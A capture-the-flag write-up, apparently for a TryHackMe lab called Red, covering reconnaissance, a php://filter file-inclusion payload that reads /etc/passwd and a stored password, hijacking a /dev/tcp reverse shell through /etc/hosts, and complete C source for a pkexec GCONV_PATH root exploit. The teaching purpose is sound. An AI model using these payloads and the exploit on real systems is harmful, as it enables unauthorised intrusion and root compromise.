# Red

Starting the challenge I do some active reconnaissance:

Nmap Scan:
```sh
nmap -sV $IP                                                              
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 19:59 CEST
Nmap scan report for $IP  
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

Directory Scanning:
```sh
ffuf -u http://$IP/FUZZ -w ../../../webhacking/wordlists/directory_scanner/common.txt                   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://$IP/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1623ms]
    * FUZZ: .htaccess

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2627ms]
    * FUZZ: .hta

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 69ms]
    * FUZZ: assets

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]
    * FUZZ: index.php

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: server-status

:: Progress: [4613/4613] :: Job [1/1] :: 560 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

This doesn't look like a lot of information and although we found /assets/ it doesn't lead to anything of interest, so I just take a look at the website.

Curl on Website:
```sh
curl -vvv $IP                                                                                                              
*   Trying $IP:80...
* Connected to $IP ($IP) port 80 (#0)
> GET / HTTP/1.1
> Host: $IP
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Fri, 06 Oct 2023 18:03:51 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Location: /index.php?page=home.html
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host $IP left intact
```

Interesting, it seems like I instantly get a redirect to `/index.php?page=home.html`.

The first thing catching my Eye is the page search with PHP. <br/>
There are some known vulnerabilities like path traversal and other stuff so I try this.
```sh
curl -vvv http://$IP/index.php?page=../../../etc/passwd
*   Trying $IP:80...
* Connected to $IP ($IP) port 80 (#0)
> GET /index.php?page=../../../etc/passwd HTTP/1.1
> Host: $IP
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Fri, 06 Oct 2023 18:07:37 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Location: /index.php?page=home.html
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host $IP left intact
```

Seems like this didn't work and after trying other variations it seems that nothing is working. <br/>
The second thing I want to try is using filters because maybe this is blocking a valid output.

```sh
curl http://$IP/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

Interesting, we found 2 Users:
- `blue`
- `red`

Seems like this worked, but reading `/etc/shadow` doesn't seem to be possible. <br/>
After trying out popular files I was able to identify an interesting file.
```sh
curl http://$IP/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history | base64 -d

echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
ls
```

This leads me to the file `.reminder`.
```
curl http://$IP/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder | base64 -d

sup3r_p@s$w0rd!
```

Seems like I found the password for an ssh login.


```sh
ssh blue@$IP -T      
The authenticity of host '$IP ($IP)' can't be established.
ED25519 key fingerprint is SHA256:Jw5VYW4+TkPGUq5z4MEIujkfaV/jzH5rIHM6bxyug/Q.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '$IP' (ED25519) to the list of known hosts.
blue@$IP's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 06 Oct 2023 06:27:04 PM UTC

  System load:  0.04              Processes:             133
  Usage of /:   60.9% of 8.87GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for ens5: 10.10.147.35
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

61 updates can be applied immediately.
6 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

Last login: Mon Apr 24 22:18:08 2023 from $IP
blue@red:~$ 
```

Seems like I got a shell, that's nice.
Getting first Flag:
```sh
blue@red:~$ ls -la
total 40
drwxr-xr-x 4 root blue 4096 Aug 14  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
-rw-r--r-- 1 blue blue  166 Oct  6 18:23 .bash_history
-rw-r--r-- 1 blue blue  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 blue blue 3771 Feb 25  2020 .bashrc
drwx------ 2 blue blue 4096 Aug 13  2022 .cache
-rw-r----- 1 root blue   34 Aug 14  2022 flag1
-rw-r--r-- 1 blue blue  807 Feb 25  2020 .profile
-rw-r--r-- 1 blue blue   16 Aug 14  2022 .reminder
drwx------ 2 root blue 4096 Aug 13  2022 .ssh
blue@red:~$ cat flag1 
THM{REDACTED}
```

After this I want to take a look at priviledge escalation.
```sh
blue@red:~$ sudo -l
[sudo] password for blue: 
Sorry, user blue may not run sudo on red.
```

Well that's anoying. Also worth noting is that there are automated messages in certain intervals which say something like this:
```sh
blue@red:~$ Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run linpeas? Yawn
blue@red:~$ I really didn't think you would make it this far
```

Anyway after doing some enumeration we find an interesting process with `ps -aux`:
```sh
red         1701  0.0  0.1   6972  2472 ?        S    18:48   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

If I can change the `redrules.thm` host entry I can redirect the reverse shell to my machine. <br/>
To do this I use the following command to overwrite the `/etc/hosts` file:
```sh
echo "10.18.20.25 redrules.thm" >> /etc/hosts
```

If we now take a look at the `/etc/hosts` file we see that it worked:
```sh
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
10.18.20.25 redrules.thm
```

After a few seconds I am able to get the reverse shell:
```sh
nc -lnvp 9001 
listening on [any] 9001 ...
connect to [$IP] from (UNKNOWN) [&IP] 54044
bash: cannot set terminal process group (1395): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ ls
ls
flag2
red@red:~$ cat * 
cat *
THM{REDACTED}
```

Enumerating the user red:
```sh
red@red:~$ ls -la
ls -la
total 36
drwxr-xr-x 4 root red  4096 Aug 17  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo
red@red:~$ ls -la .git/ 
ls -la .git/
total 40
drwxr-x--- 2 red  red   4096 Aug 14  2022 .
drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
```

That may be interesting.
```sh
red@red:~$ /home/red/.git/pkexec --version
/home/red/.git/pkexec --version
pkexec version 0.105
```

I did find an exploit for this version. Here's the link: https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html.

Makefile:
```make
all:
  gcc -shared -o evil.so -fPIC evil-so.c
  gcc exploit.c -o exploit

clean:
  rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
```

evil-so.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}
```

exploit.c:
```c
#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}
```








